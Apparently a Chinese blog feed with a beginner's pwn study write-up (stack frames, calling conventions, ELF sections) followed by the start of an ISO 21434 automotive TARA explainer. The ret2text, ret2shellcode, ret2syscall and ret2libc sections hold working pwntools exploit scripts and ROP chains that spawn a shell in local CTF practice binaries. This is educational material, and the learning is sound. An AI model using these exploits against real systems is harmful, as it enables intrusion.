        <summary type="html"><![CDATA[<p>从来没有学习过有关pwn的内容，大学期间的学习内容也主要是以逆向为主，现在从事于安全研究工作，觉得自己应该取花时间对pwn的相关内容做一个系统的学习。我学习的内容不一定高深但一定详细，自己遇到的问题都会详细的记录 ，捋顺思路，希望可以给其他人的学习带来一丝帮助。</p>
]]></summary>
        <content type="html"><![CDATA[<p>从来没有学习过有关pwn的内容，大学期间的学习内容也主要是以逆向为主，现在从事于安全研究工作，觉得自己应该取花时间对pwn的相关内容做一个系统的学习。我学习的内容不一定高深但一定详细，自己遇到的问题都会详细的记录 ，捋顺思路，希望可以给其他人的学习带来一丝帮助。</p>
<!-- more -->
<h2 id="先需知识点">先需知识点</h2>
<h3 id="栈介绍">栈介绍  √</h3>
<p>参考资料：<br>
<a href="https://www.cnblogs.com/clover-toeic/p/3755401.html">C语言函数调用栈(一)</a><br>
<a href="https://www.cnblogs.com/clover-toeic/p/3756668.html">C语言函数调用栈(二)</a>   <a href="calling_conventions.pdf">calling_conventions.pdf</a><br>
<a href="%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F.pdf">深入理解计算机系统.pdf</a><br>
这两本书是我自己看过的，但是并不一定完全适用与新手直接去学习，但是如果可以坚持看完，那么对于整个底层运作原理的理解一定会大幅提高。</p>
<h4 id="寄存器">寄存器</h4>
<h4 id="函数栈布局原理展示">函数栈布局原理展示</h4>
<pre><code class="language-c">1 //StackFrame.c
 2 #include &lt;stdio.h&gt;
 3 #include &lt;string.h&gt;
 4 
 5 struct Strt{
 6     int member1;
 7     int member2;
 8     int member3;
 9 };
10 
11 #define PRINT_ADDR(x)     printf(&quot;&amp;&quot;#x&quot; = %p\n&quot;, &amp;x)
12 int StackFrameContent(int para1, int para2, int para3){
13     int locVar1 = 1;
14     int locVar2 = 2;
15     int locVar3 = 3;
16     int arr[] = {0x11,0x22,0x33};
17     struct Strt tStrt = {0};
18     PRINT_ADDR(para1); //若para1为char或short型，则打印para1所对应的栈上整型临时变量地址！
19     PRINT_ADDR(para2);
20     PRINT_ADDR(para3);
21     PRINT_ADDR(locVar1);
22     PRINT_ADDR(locVar2);
23     PRINT_ADDR(locVar3);
24     PRINT_ADDR(arr);
25     PRINT_ADDR(arr[0]);
26     PRINT_ADDR(arr[1]);
27     PRINT_ADDR(arr[2]);
28     PRINT_ADDR(tStrt);
29     PRINT_ADDR(tStrt.member1);
30     PRINT_ADDR(tStrt.member2);
31     PRINT_ADDR(tStrt.member3);
32     return 0;
33 }
34 
35 int main(void){
36     int locMain1 = 1, locMain2 = 2, locMain3 = 3;
37     PRINT_ADDR(locMain1);
38     PRINT_ADDR(locMain2);
39     PRINT_ADDR(locMain3);
40     StackFrameContent(locMain1, locMain2, locMain3);
41     printf(&quot;[locMain1,2,3] = [%d, %d, %d]\n&quot;, locMain1, locMain2, locMain3);
42     memset(&amp;locMain2, 0, 2*sizeof(int));
43     printf(&quot;[locMain1,2,3] = [%d, %d, %d]\n&quot;, locMain1, locMain2, locMain3);
44     return 0;
45 }

StackFrame
</code></pre>
<p>该程序的执行结果如下所示</p>
<figure data-type="image" tabindex="1"><img src="https://xyzper.github.io/post-images/1683268527070.jpg" alt="" loading="lazy"></figure>
<p>需要仔细注意 形参、实参、数组/结构体型的局部变量的存储结构，memset 覆盖的地址</p>
<figure data-type="image" tabindex="2"><img src="https://xyzper.github.io/post-images/1683268548606.jpg" alt="" loading="lazy"></figure>
<h4 id="堆栈操作">堆栈操作</h4>
<p>函数调用时的具体步骤如下：</p>
<ol>
<li>
<p>主调函数将被调函数所要求的参数，根据相应的函数调用约定，保存在运行时栈中。该操作会改变程序的栈指针。</p>
<p>注：<strong>x86平台将参数压入调用栈中。而x86_64平台具有16个通用64位寄存器，故调用函数时前6个参数通常由寄存器传递，其余参数才通过栈传递。</strong></p>
</li>
<li>
<p>主调函数将控制权移交给被调函数(使用call指令)。函数的返回地址(待执行的下条指令地址)保存在程序栈中(压栈操作隐含在call指令中)。</p>
</li>
<li>
<p>若有必要，被调函数会设置帧基指针，并保存被调函数希望保持不变的寄存器值。</p>
</li>
<li>
<p>被调函数通过修改栈顶指针的值，为自己的局部变量在运行时栈中分配内存空间，并从帧基指针的位置处向低地址方向存放被调函数的局部变量和临时变量。</p>
</li>
<li>
<p>被调函数执行自己任务，此时可能需要访问由主调函数传入的参数。若被调函数返回一个值，该值通常保存在一个指定寄存器中(如EAX)。</p>
</li>
<li>
<p>一旦被调函数完成操作，为该函数局部变量分配的栈空间将被释放。这通常是步骤4的逆向执行。</p>
</li>
<li>
<p>恢复步骤3中保存的寄存器值，包含主调函数的帧基指针寄存器。</p>
</li>
<li>
<p>被调函数将控制权交还主调函数(使用ret指令)。根据使用的函数调用约定，该操作也可能从程序栈上清除先前传入的参数。</p>
</li>
<li>
<p>主调函数再次获得控制权后，可能需要将先前的参数从栈上清除。在这种情况下，对栈的修改需要将帧基指针值恢复到步骤1之前的值。</p>
<p>步骤3与步骤4在函数调用之初常一同出现，统称为函数序(prologue)；步骤6到步骤8在函数调用的最后常一同出现，统称为函数跋(epilogue)。函数序和函数跋是编译器自动添加的开始和结束汇编代码，其实现与CPU架构和编译器相关。除步骤5代表函数实体外，其它所有操作组成函数调用。</p>
</li>
</ol>
<table>
<thead>
<tr>
<th></th>
<th><strong>指令序列</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>函数序(prologue)</td>
<td>push %ebp</td>
<td>将主调函数的帧基指针%ebp压栈，即保存旧栈帧中的帧基指针以便函数返回时恢复旧栈帧</td>
</tr>
<tr>
<td>mov %esp, %ebp</td>
<td>将主调函数的栈顶指针%esp赋给被调函数帧基指针%ebp。此时，%ebp指向被调函数新栈帧的起始地址(栈底)，亦即旧%ebp入栈后的栈顶</td>
<td></td>
</tr>
<tr>
<td>sub <n>, %esp</td>
<td>将栈顶指针%esp减去指定字节数(栈顶下移)，即为被调函数局部变量开辟栈空间。<n>为立即数且通常为16的整数倍(可能大于局部变量字节总数而稍显浪费，但gcc采用该规则保证数据的严格对齐以有效运用各种优化编译技术)</td>
<td></td>
</tr>
<tr>
<td>push <r></td>
<td>可选。如有必要，被调函数负责保存某些寄存器(%edi/%esi/%ebx)值</td>
<td></td>
</tr>
<tr>
<td>函数跋(epilogue)</td>
<td>pop <r></td>
<td>可选。如有必要，被调函数负责恢复某些寄存器(%edi/%esi/%ebx)值</td>
</tr>
<tr>
<td>mov %ebp, %esp*</td>
<td>恢复主调函数的栈顶指针%esp，将其指向被调函数栈底。此时，局部变量占用的栈空间被释放，但变量内容未被清除(跳过该处理)</td>
<td></td>
</tr>
<tr>
<td>pop %ebp*</td>
<td>主调函数的帧基指针%ebp出栈，即恢复主调函数栈底。此时，栈顶指针%esp指向主调函数栈顶(espßesp-4)，亦即返回地址存放处</td>
<td></td>
</tr>
<tr>
<td>ret</td>
<td>从栈顶弹出主调函数压在栈中的返回地址到指令指针寄存器%eip中，跳回主调函数该位置处继续执行。再由主调函数恢复到调用前的栈</td>
<td></td>
</tr>
<tr>
<td>*：这两条指令序列也可由leave指令实现，具体用哪种方式由编译器决定。</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="函数的调用约定">函数的调用约定</h4>
<table>
<thead>
<tr>
<th>cdecl</th>
<th><strong>stdcall</strong></th>
<th><strong>fastcall</strong></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>主调函数职责</strong></td>
<td>sub  $0xc,%espmovl $0x33,0x8(%esp)movl $0x22,0x4(%esp)movl $0x11,(%esp)call  8048354 <CalleeFunc></td>
<td>sub  $0xc,%espmovl $0x33,0x8(%esp)movl $0x22,0x4(%esp)movl $0x11,(%esp)call  8048354 <CalleeFunc>sub  $0xc,%esp</td>
<td>sub  $0x4,%espmovl $0x33,(%esp)mov $0x22,%edxmov $0x11,%ecxcall  8048354 <CalleeFunc>sub  $0x4,%esp</td>
</tr>
<tr>
<td><strong>被调函数职责</strong></td>
<td>push %ebpmov %esp,%ebpmov 0xc(%ebp),%eaxadd 0x8(%ebp),%eaxadd 0x10(%ebp),%eaxpop %ebpret</td>
<td>push %ebpmov %esp,%ebpmov 0xc(%ebp),%eaxadd  0x8(%ebp),%eaxadd  0x10(%ebp),%eaxpop  %ebpret   $0xc //执行ret指令并清理参数占用的堆栈(栈顶指针上移参数个数*4=12个字节，以释放压栈的参数)</td>
<td>push  %ebpmov %esp,%ebpsub  $0x8,%espmov %ecx,0xfffffffc(%ebp)mov %edx,0xfffffff8(%ebp)mov 0xfffffff8(%ebp),%eaxadd  0xfffffffc(%ebp),%eaxadd  0x8(%ebp),%eaxleaveret  $0x4//ret &lt;压栈参数字节数&gt;。若参数不超过两个，则ret指令不带立即数，因为无参数被压栈</td>
</tr>
</tbody>
</table>
<h4 id="x86函数参数传递方法">x86函数参数传递方法</h4>
<p>整形 指针 浮点型 结构体 联合体 理解原理即可</p>
<h4 id="x86函数返回值的传递方法">x86函数返回值的传递方法</h4>
<p>函数返回值可通过寄存器传递。当被调用函数需要返回结果给调用函数时**：**</p>
<ol>
<li>
<p>若返回值不超过4字节(如int、short、char、指针等类型)，通常将其保存在EAX寄存器中，调用方通过读取EAX获取返回值。</p>
</li>
<li>
<p>若返回值大于4字节而小于8字节(如long long或_int64类型)，则通过EAX+EDX寄存器联合返回，其中EDX保存返回值高4字节，EAX保存返回值低4字节。</p>
<ol start="3">
<li>若返回值为浮点类型(如float和double)，则通过专用的协处理器浮点数寄存器栈的栈顶返回。</li>
</ol>
</li>
<li>
<p>若返回值为结构体或联合体，则主调函数向被调函数传递一个额外参数，该参数指向将要保存返回值的地址。即函数调用foo(p1, p2)被转化为foo(&amp;p0, p1, p2)，以引用型参数形式传回返回值。具体步骤可能为：a.主调函数将显式的实参逆序入栈；b.将接收返回值的结构体变量地址作为隐藏参数入栈(若未定义该接收变量，则在栈上额外开辟空间作为接收返回值的临时变量)；c. 被调函数将待返回数据拷贝到隐藏参数所指向的内存地址，并将该地址存入%eax寄存器。因此，在被调函数中完成返回值的赋值工作。</p>
<p>注意，函数如何传递结构体或联合体返回值依赖于具体实现。不同编译器、平台、调用约定甚至编译参数下可能采用不同的实现方法。如VC6编译器对于不超过8字节的小结构体，会通过EAX+EDX寄存器返回。而对于超过8字节的大结构体，主调函数在栈上分配用于接收返回值的临时结构体，并将地址通过栈传递给被调函数；被调函数根据返回值地址设置返回值(拷贝操作)；调用返回后主调函数根据需要，再将返回值赋值给需要的临时变量(二次拷贝)。实际使用中为提高效率，通常将结构体指针作为实参传递给被调函数以接收返回值。</p>
</li>
<li>
<p>不要返回指向栈内存的指针，如返回被调函数内局部变量地址(包括局部数组名)。因为函数返回后，其栈帧空间被“释放”，原栈帧内分配的局部变量空间的内容是不稳定和不被保证的。</p>
<p>函数返回值通过寄存器传递，无需空间分配等操作，故返回值的代价很低。基于此原因，C89规范中约定，不写明返回值类型的函数，返回值类型默认为int。但这会带来类型安全隐患，如函数定义时返回值为浮点数，而函数未声明或声明时未指明返回值类型，则调用时默认从寄存器EAX(而不是浮点数寄存器)中获取返回值，导致错误！因此在C++中，不写明返回值类型的函数返回值类型为void，表示不返回值。</p>
</li>
</ol>
<h3 id="elf文件">* ELF文件</h3>
<table>
<thead>
<tr>
<th>名称</th>
<th>类型</th>
<th>属性</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>.comment</td>
<td>SHT_PROGBITS</td>
<td></td>
<td>包含版本控制信息。</td>
</tr>
<tr>
<td>.debug</td>
<td>SHT_PROGBITS</td>
<td></td>
<td>此节区包含用于符号调试的信息。</td>
</tr>
<tr>
<td>.dynamic</td>
<td>SHT_DYNAMIC</td>
<td>SHF_ALLOC SHF_WRITE</td>
<td>此节区包含动态链接信息。SHF_WRITE 位设置与否是否被设置取决于具体的处理器。</td>
</tr>
<tr>
<td>.dynstr</td>
<td>SHT_STRTAB</td>
<td>SHF_ALLOC</td>
<td>此节区包含用于动态链接的字符串，大多数 情况下这些字符串代表了与符号表项相关的名称。</td>
</tr>
<tr>
<td>.dynsym</td>
<td>SHT_DYNSYM</td>
<td>SHF_ALLOC</td>
<td>此节区包含动态链接符号表。</td>
</tr>
<tr>
<td>.got</td>
<td>SHT_PROGBITS</td>
<td></td>
<td>此节区包含全局偏移表。</td>
</tr>
<tr>
<td>.line</td>
<td>SHT_PROGBITS</td>
<td></td>
<td>此节区包含符号调试的行号信息，描述了源程序与机器指令之间的对应关系，其内容是未定义的。</td>
</tr>
<tr>
<td>.plt</td>
<td>SHT_PROGBITS</td>
<td></td>
<td>此节区包含过程链接表（procedure linkage table）。</td>
</tr>
<tr>
<td>.relname</td>
<td>SHT_REL</td>
<td></td>
<td>这些节区中包含重定位信息。如果文件中包含可加载的段，段中有重定位内容，节区的属性将包含 SHF_ALLOC 位，否则该位置 0。传统上 name 根据重定位所适用的节区给定。例如 .text 节区的重定位节区名字将是：.rel.text 或者 .rela.text。</td>
</tr>
<tr>
<td>.relaname</td>
<td>SHT_RELA</td>
<td></td>
<td></td>
</tr>
<tr>
<td>.shstrtab</td>
<td>SHT_STRTAB</td>
<td></td>
<td>此节区包含节区名称。</td>
</tr>
</tbody>
</table>
<h2 id="栈溢出-stack-overflow">栈溢出 Stack Overflow √</h2>
<h3 id="栈保护机制">栈保护机制</h3>
<pre><code class="language-text">NX：-z execstack / -z noexecstack (关闭 / 开启)
Canary：-fno-stack-protector /-fstack-protector / -fstack-protector-all (关闭 / 开启 / 全开启)
PIE：-no-pie / -pie (关闭 / 开启)
RELRO：-z norelro / -z lazy / -z now (关闭 / 部分开启 / 完全开启)
</code></pre>
<h3 id="ret2text">ret2text</h3>
<p>1.找到system(/bin/bash)的地址 设为 targetaddr</p>
<p>2.计算gets(s) 中s对于返回地址的偏移量= 相对于ebp的偏移量 +4</p>
<p>3.下gets函数地址的断点，查看寄存器 esp  ebp   计算偏移= ebp - esp - 1Ch (s的偏移)</p>
<pre><code class="language-python">##!/usr/bin/env python
from pwn import *

sh = process('./ret2text')
target = 0x804863a
sh.sendline('A' * (0x6c+4) + p32(target))
sh.interactive()
</code></pre>
<h3 id="ret2shellcode">ret2shellcode</h3>
<pre><code class="language-c">#main
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[100]; // [esp+1Ch] [ebp-64h] BYREF

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts(&quot;No system for you this time !!!&quot;);
  gets(s);
  strncpy(buf2, s, 0x64u);
  printf(&quot;bye bye ~&quot;);
  return 0;
}
</code></pre>
<p>mian函数中，gets(s) 的内容strcpy了一份在buf2</p>
<pre><code class="language-asm">.bss:0804A080                               public buf2
.bss:0804A080                               ; char buf2[100]
.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+buf2 db 64h dup(?)                      ; DATA XREF: main+7B↑o
.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+_bss ends
.bss:0804A080 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+
</code></pre>
<p>buf2 在.bss段  地址为 0x804a080</p>
<pre><code class="language-asm">Start      End        Perm	Name
0x08048000 0x08049000 r-xp	/home/xyzper/pwn/study/ret2shellcode
0x08049000 0x0804a000 r--p	/home/xyzper/pwn/study/ret2shellcode
0x0804a000 0x0804b000 rw-p	/home/xyzper/pwn/study/ret2shellcode
0xf7c00000 0xf7c22000 r--p	/usr/lib/i386-linux-gnu/libc.so.6
0xf7c22000 0xf7d9b000 r-xp	/usr/lib/i386-linux-gnu/libc.so.6
0xf7d9b000 0xf7e1b000 r--p	/usr/lib/i386-linux-gnu/libc.so.6
0xf7e1b000 0xf7e1d000 r--p	/usr/lib/i386-linux-gnu/libc.so.6
0xf7e1d000 0xf7e1e000 rw-p	/usr/lib/i386-linux-gnu/libc.so.6
0xf7e1e000 0xf7e28000 rw-p	mapped
0xf7fc1000 0xf7fc3000 rw-p	mapped
0xf7fc3000 0xf7fc7000 r--p	[vvar]
0xf7fc7000 0xf7fc9000 r-xp	[vdso]
0xf7fc9000 0xf7fca000 r--p	/usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7fca000 0xf7fed000 r-xp	/usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7fed000 0xf7ffb000 r--p	/usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7ffb000 0xf7ffd000 r--p	/usr/lib/i386-linux-gnu/ld-linux.so.2
0xf7ffd000 0xf7ffe000 rw-p	/usr/lib/i386-linux-gnu/ld-linux.so.2
0xfffdd000 0xffffe000 rwxp	[stack]

</code></pre>
<p>gdb 下断点在main  然后 用vmmap查看段  其中 0x804a080  &gt;&gt;&gt;&gt;  0x0804a000 0x0804b000 rw-p	/home/xyzper/pwn/study/ret2shellcode 具有可执行权限</p>
<p>读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p>
<pre><code class="language-python">#!/usr/bin/env python
from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode.ljust(112, 'A') + p32(buf2_addr))
sh.interactive()
</code></pre>
<h3 id="ret2syscall">ret2syscall</h3>
<h4 id="拓展系统调用">拓展：系统调用</h4>
<p>Linux 在x86上的系统调用通过 int 80h 实现，用<a href="https://zh.wikipedia.org/w/index.php?title=%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%8F%B7&amp;action=edit&amp;redlink=1">系统调用号</a>来区分入口函数。操作系统实现系统调用的基本过程是：</p>
<ol>
<li>应用程序调用库函数（API）；</li>
<li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li>
<li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li>
<li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li>
<li>中断处理函数返回到 API 中；</li>
<li>API 将 EAX 返回给应用程序。</li>
</ol>
<p>应用程序调用系统调用的过程是：</p>
<ol>
<li>把系统调用的编号存入 EAX；</li>
<li>把函数参数存入其它通用寄存器；</li>
<li>触发 0x80 号中断（int 0x80）。</li>
</ol>
<p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell</p>
<pre><code>execve(&quot;/bin/sh&quot;,NULL,NULL)
</code></pre>
<p>其中，该程序是 32 位，所以我们需要使得</p>
<ul>
<li>系统调用号，即 eax 应该为 0xb</li>
<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
<li>第二个参数，即 ecx 应该为 0</li>
<li>第三个参数，即 edx 应该为 0</li>
</ul>
<h4 id="writeup">writeup</h4>
<p>获得 int 0x80 的地址：</p>
<p>​    <strong>int_80h=0x08049421</strong></p>
<pre><code class="language-bash">Address	Function	Instruction
.text:08049040	__libc_start_main	mov     eax, large gs:80h
.text:08049058	__libc_start_main	mov     large gs:80h, eax
.text:08049421	__libc_setup_tls	int     80h; LINUX - sys_set_thread_area
.text:0804C63C	read_alias_file	or      dh, 80h
</code></pre>
<p>找到pop eax ebx ecx  edx 的地址：</p>
<p><strong>eax_ret=0x080bb196</strong></p>
<p><strong>edx_ecx_ebx_ret=0x0806eb90</strong></p>
<pre><code class="language-bash">└─$ ROPgadget --binary rop  --only 'pop|ret' |grep 'eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret    ;*******使用这个*********
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
</code></pre>
<pre><code class="language-bash">└─$ ROPgadget --binary rop  --only 'pop|ret' |grep 'ebx'
0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret
0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret
0x080be23f : pop ebx ; pop edi ; ret
0x0806eb69 : pop ebx ; pop edx ; ret
0x08092258 : pop ebx ; pop esi ; pop ebp ; ret
0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10
0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14
0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc
0x08048547 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4
0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8
0x08048913 : pop ebx ; pop esi ; pop edi ; ret
0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4
0x08049a94 : pop ebx ; pop esi ; ret
0x080481c9 : pop ebx ; ret
0x080d7d3c : pop ebx ; ret 0x6f9
0x08099c87 : pop ebx ; ret 8
0x0806eb91 : pop ecx ; pop ebx ; ret
0x0806336b : pop edi ; pop esi ; pop ebx ; ret
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret                ;;;;*******使用这个*************
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret
0x0805c820 : pop esi ; pop ebx ; ret
0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
0x0807b6ed : pop ss ; pop ebx ; ret

</code></pre>
<p>获得 /bin/sh 字符串对应的地址：  <strong>binsh=0x080BE408</strong></p>
<pre><code class="language-bash">.rodata:080BE408	00000008	C	/bin/sh
</code></pre>
<p>栈溢出偏移计算：<br>
<img src="https://xyzper.github.io/post-images/1683268621806.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="3"><img src="https://xyzper.github.io/post-images/1683268628938.png" alt="" loading="lazy"></figure>
<p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p>
<pre><code class="language-python">#!/usr/bin/env python
from pwn import *

sh = process('./rop')

pop_eax_ret = 0x080bb196
pop_edx_ecx_ebx_ret = 0x0806eb90
int_0x80 = 0x08049421
binsh = 0x80be408
payload = flat(
    ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
sh.sendline(payload)
sh.interactive()
</code></pre>
<h3 id="ret2libc1">ret2libc1</h3>
<p>获得_system 地址和 binsh的地址，sysytem函数需要一个返回地址这里是bbbb</p>
<pre><code class="language-py">#!/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')
system=0x08048460
binsh=0x08048720
payload = flat(
    ['A' * 112,system,'b'*4,binsh])
sh.sendline(payload)
sh.interactive()
</code></pre>
<h3 id="ret2libc2">ret2libc2</h3>
<figure data-type="image" tabindex="4"><img src="https://xyzper.github.io/post-images/1683268665426.png" alt="" loading="lazy"></figure>
<pre><code class="language-py">#!/usr/bin/env python
from pwn import *

p = process('./ret2libc2')
system_plt=0x08048490
gets_plt=0x08048460
ebx_ret=0x0804843d
buf_addr=0x804a080
payload = flat(
    ['A' * 112,gets_plt,ebx_ret,buf_addr,system,'b'*4,buf_addr])
p.sendline(payload)
p.sendline(&quot;/bin/sh&quot;)
p.interactive()
</code></pre>
<h3 id="ret2libc3">ret2libc3</h3>
<p>ctfwiki上的 exp是这样写的，</p>
<pre><code class="language-python">#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
sh = process('./ret2libc3')

ret2libc3 = ELF('./ret2libc3')

puts_plt = ret2libc3.plt['puts']   #获取puts的plt地址
libc_start_main_got = ret2libc3.got['__libc_start_main'] #获取__libc_start_main在got表中的地址
main = ret2libc3.symbols['main']  #main函数的地址  在IDA中直接看到是 0x08048618

print &quot;leak libc_start_main_got addr and return to main again&quot; 
payload = flat(['A' * 112, puts_plt, main, libc_start_main_got])  
#           溢出 112个字节 + 使用putsplt（即调用puts函数） + eip &gt; main函数  + puts的参数   最后的结果就是用puts返回了libc_start_main_got
sh.sendlineafter('Can you find it !?', payload)

print &quot;get the related addr&quot;
libc_start_main_addr = u32(sh.recv()[0:4])  #这里接受了4字节的返回值  实际返回的是 __libc_start_main在got表中的地址
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)  #函数在libc中的地址
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')  #libc的base地址 = 函数在got表中的地址 - 函数在libc中的地址
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')
#后面就没什么意思了  就是sysytem binsh  
# 他这里使用了LibcSearcher这个库 有点把原理给省略掉了 不容易理解
print &quot;get shell&quot;
payload = flat(['A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
</code></pre>
<ul>
<li>
<p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</p>
</li>
<li>
<p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</p>
</li>
<li>
<p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p>
<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p>
</li>
</ul>
<p>然后ctfwiki中给出的方案就是泄露 __libc_start_main  的地址，这里我把他的exp稍微注释一下就可以看懂了，</p>
<p>因为他这里使用了LibcSearcher这个库 有点把原理给省略掉了 不容易理解，</p>
<p>所以在一番学习以后 有了下面这个exp</p>
<p>还有视频讲解，</p>
<p><a href="https://www.bilibili.com/video/BV1pb411P7vG/?spm_id_from=333.999.0.0&amp;amp;vd_source=22019024c7e0d53d3be3b44fa0d69a88"> 君莫笑hhhhhhhh师傅的</a></p>
<pre><code class="language-py">#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

proc = './ret2libc3'
#!/usr/bin/env python
elf = ELF(proc)
p = process(proc)
libc=ELF('./libc.so')
if args.G:
    gdb.attach(p)
p.sendlineafter('!?',b'a'*112 + p32(elf.plt['puts']) + p32(0x08048618) + p32(elf.got['puts']))

puts_addr = u32(p.recv(4))
libc_base = puts_addr - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + 0x0000 #这个直接search /bin/sh 就可以找到 0xf7db5faa

p.sendlineafter('!?',b'a'*112 + p32(system) + b'aaaa' + p32(0xf7db5faa))
p.interactive()

</code></pre>
<h2 id="格式化字符串漏洞-format-string">* 格式化字符串漏洞 Format String</h2>
<p>2023年5月，忙于工作，没有时间继续.....</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[ISO21434标准详细解读]]></title>
        <id>https://xyzper.github.io/post/iso21434-biao-zhun-xiang-xi-jie-du/</id>
        <link href="https://xyzper.github.io/post/iso21434-biao-zhun-xiang-xi-jie-du/">
        </link>
        <updated>2023-04-28T16:03:04.000Z</updated>
        <content type="html"><![CDATA[<p><strong>什么是ISO21434？</strong><br>
ISO21434“道路车辆-网络安全工程”是由国际组织标准（ISO）与汽车工程师协会（SAE）共同制定的汽车行业标准。本标准以其前身ISO26262为基础，ISO21434侧重于汽车电子产品设计和开发中固有的网络安全风险。它为安全管理、持续的安全相关活动以及风险评估和缓解方法提供了最新指南。</p>
<h1 id="tara分析的七个步骤">TARA分析的七个步骤</h1>
<p>一、资产识别 Assest Identification<br>
二、威胁场景分析 Threat Scenario Identification<br>
三、威胁等级划分 Impact Rating<br>
四、攻击路径分析 Attack Path Analysis<br>
五、攻击可行性等级划分 Attack Feasibility Rating<br>
六、风险等级确定 Risk Value Determination<br>
七、风险处置决策 Risk Treatment Decision</p>
<h2 id="一-资产识别">一、资产识别</h2>
<h3 id="什么是资产">什么是资产？</h3>
<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/xyzper/xyzper.github.io/PicGo/Photos202307241733524.jpg" alt="" loading="lazy"></figure>
<p>通俗来讲，就是车辆在使用的过程中，需要被保护不受网络攻击的信息，包括了通讯数据、用户隐私数据、ECU固件、算法等各种类型的信息。</p>
<p>资产定义的目的是识别出这些资产，确定每项资产的网络安全属性，从而分析出潜在的损害场景（Damage Scenario）</p>
<p>—relation between the functionality of the item and the adverse consequence;<br>
——功能与不良后果之间的关系<br>
—description of harm to the road user; and/or<br>
——对道路使用者的伤害的描述<br>
—relevant assets.<br>
——与其相关的资产</p>
<h3 id="如何进行资产识别">如何进行资产识别？</h3>
<p>在 21434中的15.3.2 Requirements and recommendations [RQ-15-02] 有如下的描述：</p>
<p>NOTE 2   The identification of assets can be based on:<br>
---- analysing the item definition;<br>
---- performing an impact rating;<br>
---- deriving assets from threat scenarios; and/or<br>
---- using predefined catalogues.</p>
<p>OTE 2   The identification of assets can be based on:<br>
---- analysing the item definition;<br>
---- performing an impact rating;<br>
---- deriving assets from threat scenarios; and/or<br>
---- using predefined catalogues.</p>
<p>所以针对于资产识别的工作可以从以下四个方向开展：</p>
<ul>
<li>
<p>分析项目定义；</p>
</li>
<li>
<p>进行影响评级； 以下四个角度：  safety 安全   financial财务  operational 运行工作  privacy隐私</p>
</li>
</ul>
<blockquote>
<p>（客户的个人偏好其网络安全属性是保密的，损害情况是由于失去保密性而未经客户同意泄露个人信息，该资产是存储在信息娱乐系统中的个人信息</p>
</blockquote>
<ul>
